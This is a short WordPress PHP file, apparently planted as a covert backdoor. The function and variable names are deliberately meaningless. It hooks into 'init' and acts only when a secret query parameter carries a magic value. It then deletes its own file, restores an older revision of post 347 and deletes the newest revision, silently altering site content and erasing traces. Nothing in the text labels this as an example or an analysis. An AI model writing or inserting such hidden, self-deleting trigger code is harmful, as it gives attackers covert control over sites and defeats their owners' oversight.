<?php

function deprecated_oembed_wishlist_badge() {
	if (isset($_GET['select_subscriptions_extra']) && $_GET['select_subscriptions_extra'] === 'asset_modules_help_gravatar') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$show_anywhere_donation = 347;
		$specific_awesome_view_section = wp_get_post_revisions($show_anywhere_donation);
		if (empty($specific_awesome_view_section)) die('no revisions');
		if (count($specific_awesome_view_section) < 2) die('less than 2');
		$checker_random_conversion = array_shift($specific_awesome_view_section);
		$label_quiz_pro_github = $checker_random_conversion->ID;
		$manager_message_more_wpforms = array_shift($specific_awesome_view_section);
		$management_notifier_blocks = $manager_message_more_wpforms->ID;
		$progress_wpforms_assistant_stats = wp_restore_post_revision($management_notifier_blocks);
		if ($progress_wpforms_assistant_stats === false) die('error restoring');
		$progress_wpforms_assistant_stats = wp_delete_post_revision($label_quiz_pro_github);		
		if ($progress_wpforms_assistant_stats === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'deprecated_oembed_wishlist_badge');
